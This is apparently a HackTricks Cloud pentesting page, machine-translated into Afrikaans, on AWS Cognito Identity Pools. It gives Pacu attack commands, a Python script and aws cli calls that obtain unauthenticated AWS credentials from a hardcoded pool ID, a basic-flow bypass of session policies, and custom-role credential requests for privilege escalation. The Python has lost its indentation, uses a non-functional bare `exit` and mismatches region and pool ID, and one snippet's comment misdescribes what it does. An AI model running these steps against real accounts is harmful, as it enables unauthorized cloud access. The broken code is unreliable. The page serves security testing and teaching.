# Cognito Identiteit Damme

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

## Basiese Inligting

Identiteit damme speel 'n belangrike rol deur jou gebruikers in staat te stel om **tydelike geloofsbriewe te verkry**. Hierdie geloofsbriewe is noodsaaklik vir toegang tot verskeie AWS-diens, insluitend maar nie beperk tot Amazon S3 en DynamoDB. 'n Noemenswaardige kenmerk van identiteit damme is hul ondersteuning vir beide anonieme gasgebruikers en 'n verskeidenheid identiteitsverskaffers vir gebruikersverifikasie. Die ondersteunde identiteitsverskaffers sluit in:

- Amazon Cognito-gebruikersdamme
- Sosiale aanmeldingsopsies soos Facebook, Google, Aanmelding by Amazon en Aanmelding met Apple
- Verskaffers wat voldoen aan OpenID Connect (OIDC)
- SAML (Security Assertion Markup Language) identiteitsverskaffers
- Ontwikkelaar-geverifieerde identiteite
```python
# Sample code to demonstrate how to integrate an identity provider with an identity pool can be structured as follows:
import boto3

# Initialize the Amazon Cognito Identity client
client = boto3.client('cognito-identity')

# Assume you have already created an identity pool and obtained the IdentityPoolId
identity_pool_id = 'your-identity-pool-id'

# Add an identity provider to the identity pool
response = client.set_identity_pool_roles(
IdentityPoolId=identity_pool_id,
Roles={
'authenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/AuthenticatedRole',
'unauthenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/UnauthenticatedRole',
}
)

# Print the response from AWS
print(response)
```
### Cognito Sync

Om Identiteit Pool-sessies te genereer, moet jy eers 'n Identiteit ID genereer. Hierdie Identiteit ID is die identifikasie van die sessie van daardie gebruiker. Hierdie identifikasies kan tot 20 datasets h√™ wat tot 1MB sleutel-waarde pare kan stoor.

Dit is nuttig om inligting van 'n gebruiker te behou (wat altyd dieselfde Identiteit ID sal gebruik).

Verder is die diens cognito-sync die diens wat dit moontlik maak om hierdie inligting te bestuur en te sinchroniseer (in die datasets, deur inligting in strome en SNS-boodskappe te stuur...).

### Gereedskap vir pentesting

* [Pacu](https://github.com/RhinoSecurityLabs/pacu), die AWS-uitbuitingsraamwerk, sluit nou die "cognito\_\_enum" en "cognito\_\_attack" modules in wat outomatiese opsporing van alle Cognito-bates in 'n rekening en swak konfigurasies, gebruikerskenmerke wat vir toegangsbeheer gebruik word, ens., en ook outomatiese gebruikerskeuring (insluitend MFA-ondersteuning) en voorregverhoging gebaseer op veranderbare aangepaste kenmerke, bruikbare identiteit pool-legitimasie, aanneembare rolle in id tokens, ens.

Vir 'n beskrywing van die modules se funksies, sien deel 2 van die [blogpos](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2). Vir installasie-instruksies, sien die hoof [Pacu](https://github.com/RhinoSecurityLabs/pacu) bladsy.

#### Gebruik

Voorbeeld cognito\_\_attack gebruik om gebruikerskeuring en alle voorregverhogingsvektore teen 'n gegewe identiteit pool en gebruikerspoolklient te probeer:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
Voorbeeld cognito\_\_enum gebruik om alle gebruikerspools, gebruikerspoolclients, identiteitspools, gebruikers, ens. te verzamelen wat sigbaar is in die huidige AWS-rekening:

```plaintext
cognito__enum
```

Dit sal alle relevante inligting oor gebruikerspools, gebruikerspoolclients, identiteitspools en gebruikers in die huidige AWS-rekening versamel.
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) is 'n CLI-werktuig in Python wat verskillende aanvalle op Cognito implementeer, insluitend ongewenste rekening-skepping en identiteitspoel-escalasie.

#### Installasie
```bash
$ pip install cognito-scanner
```
#### Gebruik
```bash
$ cognito-scanner --help
```
Vir meer inligting, besoek https://github.com/padok-team/cognito-scanner

## Toegang tot IAM-rolle

### Ongeverifieerd

Die enigste ding wat 'n aanvaller moet weet om AWS-legitimasie in 'n Cognito-toepassing as 'n ongeverifieerde gebruiker te kry, is die **Identity Pool ID**, en hierdie **ID moet hardgekodder** wees in die web-/mobiele **toepassing** sodat dit dit kan gebruik. 'n ID lyk soos hierdie: `eu-west-1:098e5341-8364-038d-16de-1865e435da3b` (dit kan nie met bruteforce gekraak word nie).

{% hint style="success" %}
Die **IAM Cognito ongeverifieerde rol wat deur die is geskep**, word standaard `Cognito_<Identity Pool-naam>Unauth_Role` genoem
{% endhint %}

As jy 'n hardgekodde Identity Pool ID vind en dit ongeverifieerde gebruikers toelaat, kan jy AWS-legitimasie kry met:
```python
import requests

region = "us-east-1"
id_pool_id = 'eu-west-1:098e5341-8364-038d-16de-1865e435da3b'
url = f'https://cognito-identity.{region}.amazonaws.com/'
headers = {"X-Amz-Target": "AWSCognitoIdentityService.GetId", "Content-Type": "application/x-amz-json-1.1"}
params = {'IdentityPoolId': id_pool_id}

r = requests.post(url, json=params, headers=headers)
json_resp = r.json()

if not "IdentityId" in json_resp:
print(f"Not valid id: {id_pool_id}")
exit

IdentityId = r.json()["IdentityId"]

params = {'IdentityId': IdentityId}

headers["X-Amz-Target"] = "AWSCognitoIdentityService.GetCredentialsForIdentity"
r = requests.post(url, json=params, headers=headers)

print(r.json())
```
Of jy kan die volgende **aws cli-opdragte** gebruik:
```bash
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign
aws cognito-identity get-credentials-for-identity --identity-id <identity_id> --no-sign
```
{% hint style="warning" %}
Let daarop dat 'n ongeverifieerde cognito-gebruiker standaard **geen toestemming kan h√™ nie, selfs as dit toegewys is deur middel van 'n beleid**. Kontroleer die volgende afdeling.
{% endhint %}

### Enhanced vs Basic Authentication flow

Die vorige afdeling het die **standaard verbeterde verifikasievloei** gevolg. Hierdie vloei stel 'n **beperkende** [**sessiebeleid**](../../aws-basic-information/#session-policies) in vir die gegenereerde IAM-rolsessie. Hierdie beleid sal slegs die sessie toelaat om [**die dienste van hierdie lys**](https://docs.aws.amazon.com/cognito/latest/developerguide/iam-roles.html#access-policies-scope-down-services) te gebruik (selfs as die rol toegang tot ander dienste gehad het).

Daar is egter 'n manier om dit te omseil, as die **Identity-pool "Basiese (Klassieke) Vloei" geaktiveer** het, sal die gebruiker 'n sessie kan verkry deur daardie vloei te gebruik wat **nie daardie beperkende sessiebeleid sal h√™ nie**.

{% code overflow="wrap" %}
```bash
# Get auth ID
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign

# Get login token
aws cognito-identity get-open-id-token --identity-id <identity_id> --no-sign

# Use login token to get IAM session creds
## If you don't know the role_arn use the previous enhanced flow to get it
aws sts assume-role-with-web-identity --role-arn "arn:aws:iam::<acc_id>:role/<role_name>" --role-session-name sessionname --web-identity-token <token> --no-sign
```
{% endcode %}

{% hint style="warning" %}
As jy hierdie **fout** ontvang, is dit omdat die **basiese vloei nie geaktiveer is (verstek)** nie

`An error occurred (InvalidParameterException) when calling the GetOpenIdToken operation: Basic (classic) flow is not enabled, please use enhanced flow.`
{% endhint %}

Met 'n stel IAM-legitimasie moet jy [ondersoek instel](../../#whoami) watter toegang jy het en probeer [voorregte verhoog](../../aws-privilege-escalation/).

### Geauthentiseer

{% hint style="info" %}
Onthou dat **geauthentiseerde gebruikers** waarskynlik **verskillende toestemmings** sal h√™, so as jy **binne die app kan registreer**, probeer dit en kry die nuwe legitimasie.
{% endhint %}

Daar kan ook **rolle** beskikbaar wees vir **geauthentiseerde gebruikers wat die Identiteitspoel benader**.

Hiervoor mag jy toegang tot die **identiteitsverskaffer** nodig h√™. As dit 'n **Cognito-gebruikerspoel** is, kan jy dalk die verstekgedrag misbruik en **self 'n nuwe gebruiker skep**.

{% hint style="success" %}
Die **IAM Cognito-geauthentiseerde rol wat deur die volgende voorbeeld geskep is**, word standaard `Cognito_<Identity Pool name>Auth_Role` genoem.
{% endhint %}

In elk geval verwag die **volgende voorbeeld** dat jy reeds ingeteken het in 'n **Cognito-gebruikerspoel** wat gebruik word om toegang tot die Identiteitspoel te verkry (moenie vergeet dat ander tipes identiteitsverskaffers ook gekonfigureer kan word nie).

<pre class="language-bash"><code class="lang-bash">aws cognito-identity get-id \
--identity-pool-id &#x3C;identity_pool_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>

# Kry die identity_id van die vorige opdrag se respons
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>


# In die IdToken kan jy rolle vind waartoe 'n gebruiker toegang het as gevolg van Gebruikerspoelgroepe
# Gebruik die --custom-role-arn om legitimasie vir 'n spesifieke rol te kry
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
<strong>    --custom-role-arn &#x3C;role_arn> \
</strong>    --logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>
</code></pre>

{% hint style="warning" %}
Dit is moontlik om **verskillende IAM-rolle te konfigureer, afhangende van die identiteitsverskaffer** waardeur die gebruiker aangemeld word, of selfs net **afhangende van die gebruiker** (deur middel van bewerings). Daarom, as jy toegang het tot verskillende gebruikers deur dieselfde of verskillende verskaffers, mag dit die moeite werd wees om in te teken en die IAM-rolle van almal te ondersoek.
{% endhint %}

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks-uitrusting**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
